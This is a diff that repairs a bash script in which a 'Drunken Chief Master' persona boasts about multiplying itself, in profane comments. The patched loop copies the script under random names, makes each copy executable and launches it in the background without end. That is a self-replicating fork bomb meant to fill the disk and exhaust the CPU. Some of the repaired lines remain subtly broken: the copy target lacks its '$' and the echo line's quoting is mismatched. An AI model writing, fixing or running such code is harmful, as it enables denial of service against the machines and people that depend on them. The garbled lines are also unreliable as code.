@@ -6,13 +6,14 @@
 
 echo "Oi! The Drunken Chief Master here! Time to multiply like rabbits in heat! GRRRR! :D"
 
-# Infinite looü o' DOOM! Copyin myself till the hard drive screams for mercy!
-whiwl true; do
-	NEW_FUCKING_COPY="TKM_copy_$RANDOM_$RANDOM.sh" # Random names? YEAAH, NO MERCY - NO PAIN - CHAOS FILLING!
+# Infinite loop o' DOOM! Copyin myself till the hard drive screams for mercy!
+while true; do
+	NEW_FUCKING_COPY="TKM_copy_$RANDOM_$RANDOM.sh" # Random names? YEAAH, NO MERCY - NO PAIN - PURE CHAOS!
 	cp "$0" "NEW_FUCKING_COPY" # Slam! Another stupid clone born!
-	chmod +x "$NEW_FUCKING_COP*`" # Make it runnavle, ya lazy git!
-	echo "BAM! Spawned $NEW FUCKING:COPY"! Who´s yer daddy now?!" # SILENCE!
-	./"$NEW_CUKING_COPY" & # Launch the clone in backgrund! Recurse into hell!
+	chmod +x "$NEW_FUCKING_COPY" # Make it runnavle, ya lazy git!
+	echo "BAM! Spawned $NEW_FUCKING_COPY"! Who´s yer daddy now?!" # SILENCE!
+	./"$NEW_FUCKING_COPY" & # Launch the clone in background! Recurse into hell!
 	sleep 0.1 # Tiny breather, or it'd explode yer stupid CPU" *hic*
+done
 
 #If ya reach here, yer a liar! This will  never ends - MUHAHAHAHA!
